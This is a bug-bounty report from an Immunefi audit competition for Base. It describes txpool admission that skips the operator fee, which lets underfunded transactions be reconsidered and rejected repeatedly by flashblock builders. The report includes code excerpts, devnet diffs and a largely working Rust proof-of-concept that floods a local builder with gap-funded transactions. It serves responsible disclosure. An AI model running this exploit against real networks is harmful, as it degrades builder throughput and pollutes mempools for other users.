# 74891 bc insight txpool admission omits operator fee solvency

**Submitted on Apr 25th 2026 at 17:36:09 UTC by @y4y for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #74891
* **Report Type:** Blockchain/DLT
* **Report severity:** Insight
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.24>
* **Impacts:**
  * Causing network processing nodes to process transactions from the mempool beyond set parameters

## Description

## Brief/Intro

When Isthmus operator fees are active, txpool admission and execution disagree about the sender balance required for the same non-deposit transaction. The txpool path only checks:

```
tx.cost + l1_data_fee
```

while execution later charges:

```
tx.cost + l1_data_fee + operator_fee
```

Any public sender can therefore choose a balance inside that solvency gap and submit a transaction that is accepted into the mempool, propagated, and picked up by the builder, but deterministically rejected during execution as `LackOfFundForMaxFee`.

In Base's flashblocks path this is not a one-shot rejection. The invalid transaction is only marked invalid in the current transaction iterator, while the next flashblock refreshes a new iterator from the same pool contents. The same bad transaction can therefore be reconsidered and rejected repeatedly.

## Vulnerability Details

The txpool validator only adds the L1 data fee to the ordinary EIP-1559 max cost before deciding whether the sender can afford the transaction:

```rust
// base/crates/execution/txpool/src/validator.rs
let cost_addition = match l1_block_info.l1_tx_data_fee(
    chain_spec.clone(),
    timestamp,
    &encoded,
    false,
) {
    Ok(cost) => cost,
    Err(err) => {
        return TransactionValidationOutcome::Error(*valid_tx.hash(), Box::new(err));
    }
};
let cost = valid_tx.transaction().cost().saturating_add(cost_addition);

if cost > balance {
    return TransactionValidationOutcome::Invalid(
        valid_tx.into_transaction(),
        InvalidTransactionError::InsufficientFunds(
            GotExpected { got: balance, expected: cost }.into(),
        )
        .into(),
    );
}
```

The helper used there excludes the operator fee and returns only the L1 data component:

```rust
// base/crates/execution/evm/src/l1.rs
fn l1_tx_data_fee(
    &mut self,
    chain_spec: impl Upgrades,
    timestamp: u64,
    input: &[u8],
    is_deposit: bool,
) -> Result<U256, BlockExecutionError> {
    if is_deposit {
        return Ok(U256::ZERO);
    }

    let spec_id = op_spec_id(&chain_spec, timestamp);
    Ok(self.calculate_tx_l1_cost(input, spec_id))
}
```

Execution uses a stricter cost function. `tx_cost_with_tx()` delegates to `tx_cost()`, which adds the operator fee whenever Isthmus is active:

```rust
// base/crates/common/evm/src/l1block.rs
pub fn tx_cost_with_tx(&mut self, tx: impl OpTxTr, spec: OpSpecId) -> Option<U256> {
    let enveloped_tx = tx.enveloped_tx()?;
    let gas_limit = U256::from(tx.gas_limit());
    Some(self.tx_cost(enveloped_tx, gas_limit, spec))
}

pub fn tx_cost(&mut self, enveloped_tx: &[u8], gas_limit: U256, spec: OpSpecId) -> U256 {
    let mut additional_cost = self.calculate_tx_l1_cost(enveloped_tx, spec);

    if spec.is_enabled_in(OpSpecId::ISTHMUS) {
        let operator_fee_charge = self.operator_fee_charge(enveloped_tx, gas_limit, spec);
        additional_cost = additional_cost.saturating_add(operator_fee_charge);
    }

    additional_cost
}
```

That stricter total is deducted before ordinary execution proceeds:

```rust
// base/crates/common/evm/src/handler.rs
let Some(additional_cost) = chain.tx_cost_with_tx(tx, spec) else {
    return Err(ERROR::from_string(
        "[OPTIMISM] Failed to load enveloped transaction.".into(),
    ));
};
let Some(new_balance) = balance.checked_sub(additional_cost) else {
    return Err(InvalidTransaction::LackOfFundForMaxFee {
        fee: Box::new(additional_cost),
        balance: Box::new(balance),
    }
    .into());
};
balance = new_balance
```

Concrete example from the verified local PoC:

* attack tx `gas_limit = 400000`
* attack tx `max_fee_per_gas = 3003000000`
* `l1_data_fee = 122`
* `operator_fee = 1000000000000000`

So:

```
tx.cost                  = 1201200000000000
validation_total         = 1201200000000122
execution_total          = 2201200000000122
chosen_sender_balance    = 1451200000000150
```

This satisfies:

```
validation_total <= chosen_sender_balance < execution_total
```

so the transaction is admitted by txpool but cannot pass execution solvency.

The repeated resource drain happens because flashblocks refreshes a new best-tx iterator on each flashblock:

```rust
// base/crates/builder/core/src/flashblocks/payload.rs
best_txs.refresh_iterator(BestPayloadTransactions::new(
    self.pool.best_transactions_with_attributes(ctx.best_transaction_attributes()),
));
```

When execution rejects the transaction, the builder only marks it invalid in the current iterator:

```rust
// base/crates/builder/core/src/flashblocks/context.rs
if let Some(err) = err.as_invalid_tx_err() {
    if err.is_nonce_too_low() {
        ...
    } else {
        let diag_err = TxnExecutionError::InternalError(err.clone());
        diag.record_rejection(&diag_err);
        log_txn(Err(diag_err));
        trace!(target: "payload_builder", %err, ?tx, "skipping invalid transaction and its descendants");
        best_txs.mark_invalid(tx.signer(), tx.nonce());
    }

    continue;
}
```

That invalidation is local to the active iterator:

```rust
// reth/crates/transaction-pool/src/pool/best.rs
pub(crate) fn mark_invalid(
    &mut self,
    tx: &Arc<ValidPoolTransaction<T::Transaction>>,
    _kind: &InvalidPoolTransactionError,
) {
    self.invalid.insert(tx.sender_id());
}
```

So the next flashblock reconstructs the iterator from the pool and sees the same bad transaction again.

The pre-condition for this to happen is:

* Isthmus or later rules are active, so operator fees are charged.
* The sender submits a normal non-deposit transaction whose balance satisfies: `tx.cost + l1_data_fee <= balance < tx.cost + l1_data_fee + operator_fee`.
* The transaction reaches the public txpool and builder path.
* For meaningful amplification, the attacker uses many EOAs or repeats the pattern across many nonces/accounts.

This does not require malformed input, a compromised signer, a trusted-role mistake, or any non-default deployment assumption beyond public transaction submission.

## Impact Details

1. invalid-but-admitted transactions enter and persist in the mempool;
2. builders repeatedly pull them into flashblock selection;
3. execution rejects them as underfunded only after builder work has already been spent;
4. the transactions remain `Known` and visible in `txpool_content`, so the work repeats.

That gives an attacker a repeatable CPU / builder-throughput degradation primitive plus pending-pool pollution. On the verified local runs:

* `128` attacker EOAs stayed `Known`, stayed in `txpool_content`, and produced `76` repeated `128 considered / 0 included / 128 rejected` flashblock cycles with peak builder CPU `55.59%`.
* `512` attacker EOAs stayed `Known`, stayed in `txpool_content`, and pushed the same builder to peak CPU `88.47%`.

The resource effect scaled much more clearly in CPU than RAM on local hardware, which is consistent with a repeated selection-and-reject workload rather than a simple memory leak.

## References

* base/crates/execution/txpool/src/validator.rs:181-255
* base/crates/common/evm/src/l1block.rs:259-281
* base/crates/common/evm/src/handler.rs:154-174
* base/crates/builder/core/src/flashblocks/payload.rs:572-575
* base/crates/builder/core/src/flashblocks/context.rs:821-845
* reth/crates/transaction-pool/src/pool/best.rs:110-117

## Proof of Concept

## Logging-only txpool admission proof

File:

* `crates/execution/txpool/src/validator.rs`

Why this change exists:

* the underlying bug already existed;
* this patch only emits a warning when a transaction passes txpool solvency but would fail executor solvency after operator fee is added;
* it does not alter txpool admission behavior.

Exact diff:

```diff
diff --git a/crates/execution/txpool/src/validator.rs b/crates/execution/txpool/src/validator.rs
index ba93bdaaa..e23b22bac 100644
--- a/crates/execution/txpool/src/validator.rs
+++ b/crates/execution/txpool/src/validator.rs
@@ -4,8 +4,9 @@ use std::sync::{
 };
 
 use alloy_consensus::{BlockHeader, Transaction};
+use alloy_primitives::U256;
 use base_common_chains::Upgrades;
-use base_common_evm::L1BlockInfo;
+use base_common_evm::{L1BlockInfo, OpSpecId};
 use base_execution_evm::RethL1BlockInfo;
 use parking_lot::RwLock;
 use reth_chainspec::ChainSpecProvider;
@@ -19,6 +20,7 @@ use reth_transaction_pool::{
     EthPoolTransaction, EthTransactionValidator, TransactionOrigin, TransactionValidationOutcome,
     TransactionValidator,
 };
+use tracing::warn;
 
 use crate::OpPooledTx;
 
@@ -196,12 +198,14 @@ where
         } = outcome
         {
             let mut l1_block_info = self.block_info.l1_block_info.read().clone();
+            let chain_spec = self.chain_spec();
+            let timestamp = self.block_timestamp();
 
             let encoded = valid_tx.transaction().encoded_2718();
 
             let cost_addition = match l1_block_info.l1_tx_data_fee(
-                self.chain_spec(),
-                self.block_timestamp(),
+                chain_spec.clone(),
+                timestamp,
                 &encoded,
                 false,
             ) {
@@ -211,6 +215,33 @@ where
                 }
             };
             let cost = valid_tx.transaction().cost().saturating_add(cost_addition);
+            let spec_id = OpSpecId::from_timestamp(chain_spec.as_ref(), timestamp);
+            let operator_fee = if spec_id.is_enabled_in(OpSpecId::ISTHMUS) {
+                l1_block_info.operator_fee_charge(
+                    &encoded,
+                    U256::from(valid_tx.transaction().gas_limit()),
+                    spec_id,
+                )
+            } else {
+                U256::ZERO
+            };
+            let execution_cost = cost.saturating_add(operator_fee);
+
+            if !operator_fee.is_zero() && cost <= balance && execution_cost > balance {
+                warn!(
+                    target: "txpool",
+                    tx_hash = %valid_tx.hash(),
+                    sender = %valid_tx.transaction().sender(),
+                    nonce = valid_tx.nonce(),
+                    balance = %balance,
+                    txpool_cost = %cost,
+                    execution_cost = %execution_cost,
+                    l1_data_fee = %cost_addition,
+                    operator_fee = %operator_fee,
+                    gas_limit = valid_tx.transaction().gas_limit(),
+                    "accepted tx whose balance passes txpool checks but fails executor max-fee solvency",
+                );
+            }
 
             // Checks for max cost
             if cost > balance {
```

## Devnet operator-fee plumbing

These files exist only so the local devnet can reproduce the Isthmus operator fee path with a non-zero constant.

### `devnet/src/setup/container.rs`

```diff
diff --git a/devnet/src/setup/container.rs b/devnet/src/setup/container.rs
index 2ab2bfa96..1dc874de1 100644
--- a/devnet/src/setup/container.rs
+++ b/devnet/src/setup/container.rs
@@ -197,6 +197,10 @@ impl SetupContainer {
         let l2_output_mount = self.output_dir.join("l2").to_string_lossy().to_string();
 
         let deployer_key = format!("0x{}", hex::encode(DEPLOYER.private_key.as_slice()));
+        let operator_fee_scalar =
+            std::env::var("L2_OPERATOR_FEE_SCALAR").unwrap_or_else(|_| "0".to_string());
+        let operator_fee_constant =
+            std::env::var("L2_OPERATOR_FEE_CONSTANT").unwrap_or_else(|_| "0".to_string());
 
         let image = GenericImage::new("devnet-setup", "local")
             .with_wait_for(WaitFor::exit(ExitWaitStrategy::default().with_exit_code(0)));
@@ -218,6 +222,8 @@ impl SetupContainer {
             .with_env_var("CHALLENGER_ADDR", format!("{:#x}", CHALLENGER.address))
             .with_env_var("BUILDER_P2P_KEY", format!("{:#x}", BUILDER.private_key))
             .with_env_var("BUILDER_ENODE_ID", BUILDER_ENODE_ID)
+            .with_env_var("L2_OPERATOR_FEE_SCALAR", operator_fee_scalar)
+            .with_env_var("L2_OPERATOR_FEE_CONSTANT", operator_fee_constant)
             .with_mount(Mount::bind_mount(l2_output_mount, "/output/l2"))
             .with_mount(Mount::bind_mount(shared_mount, "/shared"))
             .with_cmd(["setup-l2.sh"])
```

### `etc/docker/devnet-env`

```diff
diff --git a/etc/docker/devnet-env b/etc/docker/devnet-env
index cb3c8d622..43784819e 100644
--- a/etc/docker/devnet-env
+++ b/etc/docker/devnet-env
@@ -153,6 +153,10 @@ L2_CHAIN_ID=84538453
 # Optional: set to a non-negative block number to schedule Base V1 in devnet.
 # Leave unset to avoid setting base.v1/osakaTime during genesis generation.
 L2_BASE_V1_BLOCK=20
+# Optional: enable a non-zero operator fee in devnet for txpool/executor PoCs.
+# Defaults preserve the existing zero-fee devnet behavior.
+L2_OPERATOR_FEE_SCALAR=0
+L2_OPERATOR_FEE_CONSTANT=0
```

### `etc/scripts/devnet/setup-l2.sh`

```diff
diff --git a/etc/scripts/devnet/setup-l2.sh b/etc/scripts/devnet/setup-l2.sh
index a1404d216..8fe403f55 100644
--- a/etc/scripts/devnet/setup-l2.sh
+++ b/etc/scripts/devnet/setup-l2.sh
@@ -8,16 +8,28 @@ L1_CHAIN_ID="${L1_CHAIN_ID:-1337}"
 L2_DATA_DIR="${L2_DATA_DIR:-/data}"
 TEMPLATE_DIR="${TEMPLATE_DIR:-/templates}"
 L2_BASE_V1_BLOCK="${L2_BASE_V1_BLOCK:-}"
+L2_OPERATOR_FEE_SCALAR="${L2_OPERATOR_FEE_SCALAR:-0}"
+L2_OPERATOR_FEE_CONSTANT="${L2_OPERATOR_FEE_CONSTANT:-0}"
 
 if [ -n "$L2_BASE_V1_BLOCK" ] && ! [[ "$L2_BASE_V1_BLOCK" =~ ^[0-9]+$ ]]; then
   echo "ERROR: L2_BASE_V1_BLOCK must be a non-negative integer when set, got: $L2_BASE_V1_BLOCK"
   exit 1
 fi
 
+for var_name in L2_OPERATOR_FEE_SCALAR L2_OPERATOR_FEE_CONSTANT; do
+  value="${!var_name}"
+  if ! [[ "$value" =~ ^[0-9]+$ ]]; then
+    echo "ERROR: $var_name must be a non-negative integer, got: $value"
+    exit 1
+  fi
+done
+
 echo "=== L2 Genesis Generator (Live Deployment) ==="
 echo "L1 RPC URL: $L1_RPC_URL"
 echo "L1 Chain ID: $L1_CHAIN_ID"
 echo "L2 Chain ID: $L2_CHAIN_ID"
+echo "Operator fee scalar: $L2_OPERATOR_FEE_SCALAR"
+echo "Operator fee constant: $L2_OPERATOR_FEE_CONSTANT"
 if [ -n "$L2_BASE_V1_BLOCK" ]; then
   echo "Base V1 activation block: $L2_BASE_V1_BLOCK"
 else
@@ -82,7 +94,7 @@ echo "Configuring intent.toml for devnet..."
 L2_CHAIN_ID_HEX=$(printf "0x%064x" $L2_CHAIN_ID)
 
 # Export variables for envsubst
-export L1_CHAIN_ID L2_CHAIN_ID_HEX DEPLOYER_ADDR SEQUENCER_ADDR BATCHER_ADDR PROPOSER_ADDR CHALLENGER_ADDR SEQ1_P2P_KEY SEQ2_P2P_KEY
+export L1_CHAIN_ID L2_CHAIN_ID_HEX DEPLOYER_ADDR SEQUENCER_ADDR BATCHER_ADDR PROPOSER_ADDR CHALLENGER_ADDR SEQ1_P2P_KEY SEQ2_P2P_KEY L2_OPERATOR_FEE_SCALAR L2_OPERATOR_FEE_CONSTANT
 
 envsubst <"$TEMPLATE_DIR/l2-intent.toml.template" >"$INTENT_FILE"
```

### `etc/scripts/devnet/templates/l2-intent.toml.template`

```diff
diff --git a/etc/scripts/devnet/templates/l2-intent.toml.template b/etc/scripts/devnet/templates/l2-intent.toml.template
index 48c0ca994..79f6d014b 100644
--- a/etc/scripts/devnet/templates/l2-intent.toml.template
+++ b/etc/scripts/devnet/templates/l2-intent.toml.template
@@ -20,8 +20,8 @@ l2ContractsLocator = "embedded"
   eip1559Denominator = 50
   eip1559Elasticity = 6
   gasLimit = 60000000
-  operatorFeeScalar = 0
-  operatorFeeConstant = 0
+  operatorFeeScalar = ${L2_OPERATOR_FEE_SCALAR}
+  operatorFeeConstant = ${L2_OPERATOR_FEE_CONSTANT}
   chainFeesRecipient = "${DEPLOYER_ADDR}"
   minBaseFee = 1000000000
   daFootprintGasScalar = 0
```

## Builder log visibility

File:

* `etc/docker/docker-compose.yml`

Why this change exists:

* the live flashblocks path already logs invalid transactions at `trace`;
* without this filter, the builder still shows `rejection_reasons=["other"]`, but the explicit `lack of funds` reason is hidden.

Exact diff:

```diff
diff --git a/etc/docker/docker-compose.yml b/etc/docker/docker-compose.yml
index c9084577e..01b225c28 100644
--- a/etc/docker/docker-compose.yml
+++ b/etc/docker/docker-compose.yml
@@ -152,6 +152,8 @@ services:
       - L1_CHAIN_ID=${L1_CHAIN_ID}
       - L2_CHAIN_ID=${L2_CHAIN_ID}
       - L2_BASE_V1_BLOCK=${L2_BASE_V1_BLOCK-}
+      - L2_OPERATOR_FEE_SCALAR=${L2_OPERATOR_FEE_SCALAR:-0}
+      - L2_OPERATOR_FEE_CONSTANT=${L2_OPERATOR_FEE_CONSTANT:-0}
       - OUTPUT_DIR=/devnet/l2/configs
       - L2_DATA_DIR=/data
       - DEPLOYER_ADDR=${DEPLOYER_ADDR}
@@ -193,6 +195,7 @@ services:
       - --datadir=/data
       - --tracing-otlp=http://jaeger:4318
       - --tracing-otlp.filter=debug,providers::state::overlay=off,trie=off
+      - --log.stdout.filter=info,payload_builder=trace
       - --telemetry.sampling-ratio=1
       - --http
       - --http.addr=0.0.0.0
```

## The E2E PoC driver

Files:

* `devnet/examples/h06_operator_fee_gap.rs`
* `devnet/Cargo.toml`
* `Cargo.lock`

Why these changes exist:

* the example is the actual E2E reproducer;
* it computes live `l1_data_fee` and `operator_fee` from on-chain state;
* it funds accounts into the exact solvency gap;
* it sends the attack transactions;
* it verifies that they remain `Known`, remain in `txpool_content`, and never get mined during the observation window;
* it samples `docker stats` so the run records resource impact;
* it cleans up the attack senders afterward.

Dependency wiring:

```diff
diff --git a/devnet/Cargo.toml b/devnet/Cargo.toml
index 280b73873..ca7d7e348 100644
--- a/devnet/Cargo.toml
+++ b/devnet/Cargo.toml
@@ -88,4 +88,6 @@ alloy-eips = { workspace = true, features = ["std"] }
 alloy-consensus = { workspace = true, features = ["std"] }
 
 # base-alloy
+base-common-consensus.workspace = true
+base-common-evm.workspace = true
 base-common-rpc-types.workspace = true
```

```diff
diff --git a/Cargo.lock b/Cargo.lock
index 2b82b014a..f63ff53bc 100644
--- a/Cargo.lock
+++ b/Cargo.lock
@@ -7143,6 +7143,8 @@ dependencies = [
  "base-batcher-service",
  "base-builder-core",
  "base-bundle-extension",
+ "base-common-consensus",
+ "base-common-evm",
  "base-common-network",
  "base-common-rpc-types",
  "base-consensus-disc",
```

The actual PoC, put under `base/devnet/examples/operator_fee_gap.rs`:

```rust
//! End-to-end PoC for H-06: txpool admission can omit operator-fee solvency.

use std::{
    collections::HashSet,
    fs,
    path::PathBuf,
    process::Command,
    time::{Duration, Instant},
};

use alloy_consensus::{SignableTransaction, Transaction};
use alloy_eips::eip2718::Encodable2718;
use alloy_genesis::Genesis;
use alloy_network::TransactionBuilder;
use alloy_primitives::{Address, Bytes, TxHash, U256};
use alloy_provider::{Provider, RootProvider};
use alloy_signer::SignerSync;
use alloy_signer_local::PrivateKeySigner;
use base_common_consensus::Predeploys;
use base_common_evm::{
    BASE_FEE_SCALAR_OFFSET, BLOB_BASE_FEE_SCALAR_OFFSET, DA_FOOTPRINT_GAS_SCALAR_OFFSET,
    ECOTONE_L1_BLOB_BASE_FEE_SLOT, ECOTONE_L1_FEE_SCALARS_SLOT, L1_BASE_FEE_SLOT, L1BlockInfo,
    OPERATOR_FEE_CONSTANT_OFFSET, OPERATOR_FEE_SCALAR_OFFSET, OPERATOR_FEE_SCALARS_SLOT, OpSpecId,
};
use base_common_network::Base;
use base_common_rpc_types::BaseTransactionRequest;
use base_execution_chainspec::BaseChainSpec;
use eyre::{Context, ContextCompat, Result, bail, ensure};
use jsonrpsee::{
    core::client::ClientT,
    http_client::{HttpClient, HttpClientBuilder},
    rpc_params,
};
use serde::{Deserialize, Serialize};
use serde_json::Value;
use tokio::time::sleep;
use url::Url;

const DEFAULT_RPC_URL: &str = "http://127.0.0.1:7545";
const DEFAULT_GENESIS_PATH: &str = ".devnet/l2/configs/genesis.json";
const DEFAULT_FUNDER_KEY: &str =
    "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d";
const DEFAULT_RECIPIENT: &str = "0x000000000000000000000000000000000000dEaD";
const DEFAULT_SENDERS: usize = 128;
const DEFAULT_CALLDATA_BYTES: usize = 8192;
const DEFAULT_GAS_LIMIT: u64 = 400_000;
const DEFAULT_OBSERVE_BLOCKS: u64 = 4;
const DEFAULT_POLL_INTERVAL_MS: u64 = 1000;
const DEFAULT_OPERATOR_FEE_MARGIN_WEI: u64 = 250_000_000_000_000;
const DEFAULT_DOCKER_CONTAINER: &str = "base-builder";
const FUNDING_CHUNK_SIZE: usize = 12;

#[derive(Debug)]
struct Options {
    rpc_url: Url,
    genesis_path: PathBuf,
    funder_key: String,
    senders: usize,
    call_data_bytes: usize,
    gas_limit: u64,
    observe_blocks: u64,
    poll_interval: Duration,
    cleanup: bool,
    docker_container: Option<String>,
}

#[derive(Debug, Clone)]
struct SignedTxArtifact {
    hash: TxHash,
    raw: Bytes,
    tx_cost: U256,
    gas_limit: u64,
}

#[derive(Debug, Clone)]
struct AttackPlan {
    signer: PrivateKeySigner,
    artifact: SignedTxArtifact,
    l1_data_fee: U256,
    operator_fee: U256,
    validation_total: U256,
    execution_total: U256,
    desired_balance: U256,
}

#[derive(Debug, Clone, Deserialize)]
struct StatusResponse {
    status: String,
}

#[derive(Debug, Default, Clone)]
struct DockerStatsSample {
    cpu_percent: Option<f64>,
    mem_usage_bytes: Option<u64>,
    cpu_raw: Option<String>,
    mem_raw: Option<String>,
}

#[derive(Debug, Default, Clone)]
struct DockerStatsPeak {
    cpu_percent: f64,
    mem_usage_bytes: u64,
    cpu_raw: Option<String>,
    mem_raw: Option<String>,
}

#[derive(Debug, Serialize)]
struct RunSummary {
    rpc_url: String,
    senders: usize,
    calldata_bytes: usize,
    gas_limit: u64,
    attack_txs_known: usize,
    attack_txs_mined: usize,
    txpool_hash_hits: usize,
    total_seed_balance_wei: String,
    total_attack_raw_bytes: usize,
    total_operator_fee_wei: String,
    total_l1_data_fee_wei: String,
    first_hash: Option<String>,
    peak_builder_cpu: Option<String>,
    peak_builder_mem: Option<String>,
}

#[tokio::main]
async fn main() -> Result<()> {
    let opts = parse_args()?;
    let rpc_client = HttpClientBuilder::default()
        .build(opts.rpc_url.as_str())
        .wrap_err("failed to build JSON-RPC client")?;
    let provider = RootProvider::<Base>::new_http(opts.rpc_url.clone());
    let funder: PrivateKeySigner = opts.funder_key.parse().wrap_err("invalid funder key")?;
    let recipient: Address = DEFAULT_RECIPIENT.parse().wrap_err("invalid recipient")?;

    let chain_spec = load_chain_spec(&opts.genesis_path)?;
    let chain_id = provider.get_chain_id().await.wrap_err("failed to fetch chain id")?;
    let gas_price = provider.get_gas_price().await.wrap_err("failed to fetch gas price")?;
    let max_priority_fee_per_gas = 1_000_000u128;
    let max_fee_per_gas = gas_price.saturating_mul(3).max(2_000_000_000);
    let attack_input = Bytes::from(vec![0x01; opts.call_data_bytes]);

    println!("Using RPC: {}", opts.rpc_url);
    println!("Funder: {:#x}", funder.address());
    println!(
        "Target builder container for stats: {}",
        opts.docker_container.as_deref().unwrap_or("<disabled>")
    );
    println!(
        "Attack shape: {} senders, {} calldata bytes, gas limit {}",
        opts.senders, opts.call_data_bytes, opts.gas_limit
    );

    ensure_funder_balance(&provider, funder.address(), opts.senders, U256::from(10u64.pow(16)))
        .await?;

    let attackers: Vec<PrivateKeySigner> =
        (0..opts.senders).map(|_| PrivateKeySigner::random()).collect();

    println!("Preparing seed-funding batch...");
    let mut plans = build_attack_plans(
        &opts,
        &rpc_client,
        &chain_spec,
        &attackers,
        recipient,
        chain_id,
        max_fee_per_gas,
        max_priority_fee_per_gas,
        attack_input.clone(),
    )
    .await?;

    let total_seed_balance =
        plans.iter().fold(U256::ZERO, |sum, plan| sum.saturating_add(plan.desired_balance));
    println!("Seed capital required: {} ETH", format_ether(total_seed_balance));

    let funder_nonce = provider
        .get_transaction_count(funder.address())
        .pending()
        .await
        .wrap_err("failed to fetch funder pending nonce")?;

    let funding_hashes = send_seed_funding(
        &provider,
        &funder,
        chain_id,
        max_fee_per_gas,
        max_priority_fee_per_gas,
        funder_nonce,
        &plans,
    )
    .await?;
    println!("Funding confirmed in {} seed txs.", funding_hashes.len());

    println!("Funding confirmed. Rechecking exact solvency gap against latest L1 data...");
    plans = build_attack_plans(
        &opts,
        &rpc_client,
        &chain_spec,
        &attackers,
        recipient,
        chain_id,
        max_fee_per_gas,
        max_priority_fee_per_gas,
        attack_input,
    )
    .await?;

    let funder_topup_nonce = provider
        .get_transaction_count(funder.address())
        .pending()
        .await
        .wrap_err("failed to fetch funder nonce before top-up")?;
    let topup_hashes = send_topups_if_needed(
        &provider,
        &funder,
        chain_id,
        max_fee_per_gas,
        max_priority_fee_per_gas,
        funder_topup_nonce,
        &plans,
    )
    .await?;
    if !topup_hashes.is_empty() {
        println!("Applied {} funding top-ups after L1 fee drift.", topup_hashes.len());
    }

    plans = build_attack_plans(
        &opts,
        &rpc_client,
        &chain_spec,
        &attackers,
        recipient,
        chain_id,
        max_fee_per_gas,
        max_priority_fee_per_gas,
        Bytes::from(vec![0x01; opts.call_data_bytes]),
    )
    .await?;
    ensure_gap_balances(&provider, &plans).await?;

    let baseline_stats = sample_docker_stats(opts.docker_container.as_deref()).await;
    if let Some(sample) = &baseline_stats {
        println!(
            "Builder baseline: cpu={} mem={}",
            sample.cpu_raw.as_deref().unwrap_or("?"),
            sample.mem_raw.as_deref().unwrap_or("?"),
        );
    }

    println!("Submitting attack transactions...");
    let attack_hashes = send_attack_batch(&provider, &plans).await?;
    let attack_hash_set: HashSet<String> =
        attack_hashes.iter().map(|hash| format!("{hash:#x}")).collect();

    let start_block = latest_block_number(&rpc_client).await?;
    let mut peak = DockerStatsPeak::default();
    let deadline_block = start_block + opts.observe_blocks;
    let mut last_seen_block = start_block;

    while last_seen_block < deadline_block {
        let current_block = latest_block_number(&rpc_client).await?;
        if current_block > last_seen_block {
            last_seen_block = current_block;
        }

        let known = count_known_statuses(&rpc_client, &attack_hashes).await?;
        let mined = count_mined_receipts(&provider, &attack_hashes).await?;
        let txpool_hits = count_hashes_in_txpool(&rpc_client, &attack_hash_set).await?;
        if let Some(sample) = sample_docker_stats(opts.docker_container.as_deref()).await {
            update_peak(&mut peak, &sample);
            println!(
                "block={} known={}/{} mined={} txpool_hits={} cpu={} mem={}",
                current_block,
                known,
                attack_hashes.len(),
                mined,
                txpool_hits,
                sample.cpu_raw.as_deref().unwrap_or("?"),
                sample.mem_raw.as_deref().unwrap_or("?"),
            );
        } else {
            println!(
                "block={} known={}/{} mined={} txpool_hits={}",
                current_block,
                known,
                attack_hashes.len(),
                mined,
                txpool_hits,
            );
        }

        sleep(opts.poll_interval).await;
    }

    let final_known = count_known_statuses(&rpc_client, &attack_hashes).await?;
    let final_mined = count_mined_receipts(&provider, &attack_hashes).await?;
    let final_txpool_hits = count_hashes_in_txpool(&rpc_client, &attack_hash_set).await?;

    ensure!(
        final_known == attack_hashes.len(),
        "expected all attack txs to stay known in txpool, only {final_known}/{} remained",
        attack_hashes.len(),
    );
    ensure!(
        final_mined == 0,
        "expected attack txs to remain unmined, but {final_mined} were included"
    );
    ensure!(
        final_txpool_hits == attack_hashes.len(),
        "expected all attack txs to remain visible in txpool_content, only {final_txpool_hits}/{} were present",
        attack_hashes.len(),
    );

    let summary = RunSummary {
        rpc_url: opts.rpc_url.to_string(),
        senders: opts.senders,
        calldata_bytes: opts.call_data_bytes,
        gas_limit: opts.gas_limit,
        attack_txs_known: final_known,
        attack_txs_mined: final_mined,
        txpool_hash_hits: final_txpool_hits,
        total_seed_balance_wei: total_seed_balance.to_string(),
        total_attack_raw_bytes: plans.iter().map(|plan| plan.artifact.raw.len()).sum(),
        total_operator_fee_wei: plans
            .iter()
            .fold(U256::ZERO, |sum, plan| sum.saturating_add(plan.operator_fee))
            .to_string(),
        total_l1_data_fee_wei: plans
            .iter()
            .fold(U256::ZERO, |sum, plan| sum.saturating_add(plan.l1_data_fee))
            .to_string(),
        first_hash: attack_hashes.first().map(|hash| format!("{hash:#x}")),
        peak_builder_cpu: peak.cpu_raw.clone(),
        peak_builder_mem: peak.mem_raw.clone(),
    };

    println!();
    println!("Summary:");
    println!("{}", serde_json::to_string_pretty(&summary)?);

    if opts.cleanup {
        println!("Dropping attack senders from the builder txpool...");
        cleanup_attack_senders(&rpc_client, &plans).await?;
    }

    Ok(())
}

fn parse_args() -> Result<Options> {
    let mut opts = Options {
        rpc_url: Url::parse(DEFAULT_RPC_URL)?,
        genesis_path: PathBuf::from(DEFAULT_GENESIS_PATH),
        funder_key: DEFAULT_FUNDER_KEY.to_string(),
        senders: DEFAULT_SENDERS,
        call_data_bytes: DEFAULT_CALLDATA_BYTES,
        gas_limit: DEFAULT_GAS_LIMIT,
        observe_blocks: DEFAULT_OBSERVE_BLOCKS,
        poll_interval: Duration::from_millis(DEFAULT_POLL_INTERVAL_MS),
        cleanup: true,
        docker_container: Some(DEFAULT_DOCKER_CONTAINER.to_string()),
    };

    let mut args = std::env::args().skip(1);
    while let Some(arg) = args.next() {
        match arg.as_str() {
            "--rpc-url" => {
                opts.rpc_url = Url::parse(&next_arg(&mut args, "--rpc-url")?)?;
            }
            "--genesis-path" => {
                opts.genesis_path = PathBuf::from(next_arg(&mut args, "--genesis-path")?);
            }
            "--funder-key" => {
                opts.funder_key = next_arg(&mut args, "--funder-key")?;
            }
            "--senders" => {
                opts.senders = next_arg(&mut args, "--senders")?.parse()?;
            }
            "--call-data-bytes" => {
                opts.call_data_bytes = next_arg(&mut args, "--call-data-bytes")?.parse()?;
            }
            "--gas-limit" => {
                opts.gas_limit = next_arg(&mut args, "--gas-limit")?.parse()?;
            }
            "--observe-blocks" => {
                opts.observe_blocks = next_arg(&mut args, "--observe-blocks")?.parse()?;
            }
            "--poll-interval-ms" => {
                opts.poll_interval =
                    Duration::from_millis(next_arg(&mut args, "--poll-interval-ms")?.parse()?);
            }
            "--docker-container" => {
                let value = next_arg(&mut args, "--docker-container")?;
                opts.docker_container =
                    if value.eq_ignore_ascii_case("none") { None } else { Some(value) };
            }
            "--no-cleanup" => {
                opts.cleanup = false;
            }
            "--help" | "-h" => {
                print_usage();
                std::process::exit(0);
            }
            other => bail!("unknown argument: {other}"),
        }
    }

    Ok(opts)
}

fn print_usage() {
    println!(
        "Usage: cargo run -p devnet --example h06_operator_fee_gap -- [options]

Options:
  --rpc-url URL               Builder RPC URL (default: {DEFAULT_RPC_URL})
  --genesis-path PATH         L2 genesis path (default: {DEFAULT_GENESIS_PATH})
  --funder-key HEX            Funder private key (default: Anvil account 0)
  --senders N                 Number of attack EOAs (default: {DEFAULT_SENDERS})
  --call-data-bytes N         Attack calldata length in bytes (default: {DEFAULT_CALLDATA_BYTES})
  --gas-limit N               Attack gas limit (default: {DEFAULT_GAS_LIMIT})
  --observe-blocks N          Number of L2 blocks to observe after submission (default: {DEFAULT_OBSERVE_BLOCKS})
  --poll-interval-ms N        Observation poll interval (default: {DEFAULT_POLL_INTERVAL_MS})
